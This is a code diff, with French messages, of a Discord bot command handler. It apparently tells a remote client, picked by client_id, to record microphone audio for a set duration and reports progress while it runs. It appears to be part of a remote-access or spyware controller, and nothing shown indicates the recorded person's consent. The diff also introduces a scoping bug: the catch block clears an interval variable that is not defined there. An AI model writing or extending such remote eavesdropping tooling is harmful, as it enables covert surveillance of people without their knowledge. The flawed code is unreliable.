@@ -69,19 +69,32 @@ export const handleMicrophoneCommand = async (interaction) => {
     const clientId = interaction.options.getString('client_id');
     const duration = interaction.options.getInteger('duration');
     await interaction.deferReply({ ephemeral: true });
+
     const url = `${API_BASE_URL}/command/${clientId}`;
+    const data = {
+        command: 'audio',
+        params: { duration }
+    };
+
     try {
-        const data = {
-            command: 'audio',
-            params: {
-                duration: duration
-            }
-        };
         await executeRequestWithTokenRefresh(url, { method: 'POST', data });
-        await interaction.editReply(`${commands.find(command => command.name === 'microphone').description}`);
+        await interaction.editReply(`Démarrage de l'enregistrement audio pour le client ${clientId}...`);
+
+        let elapsedSeconds = 0;
+        const intervalId = setInterval(async () => {
+            elapsedSeconds++;
+            const percentage = Math.min((elapsedSeconds / duration) * 100, 100).toFixed(0);
+            await interaction.editReply(`Enregistrement en cours... ${percentage}% complété.`);
+            if (elapsedSeconds >= duration) {
+                clearInterval(intervalId);
+                await interaction.editReply(`Enregistrement audio terminé pour le client ${clientId}.`);
+            }
+        }, 1000);
+
     } catch (error) {
-        console.error("Erreur lors de l'envoi de la commande", error);
-        await interaction.editReply("Erreur lors de l'envoi de la commande.");
+        console.error("Erreur lors de l'envoi de la commande d'enregistrement audio", error);
+        await interaction.editReply("Erreur lors de l'envoi de la commande d'enregistrement audio.");
+        clearInterval(intervalId);
     }
 };
 
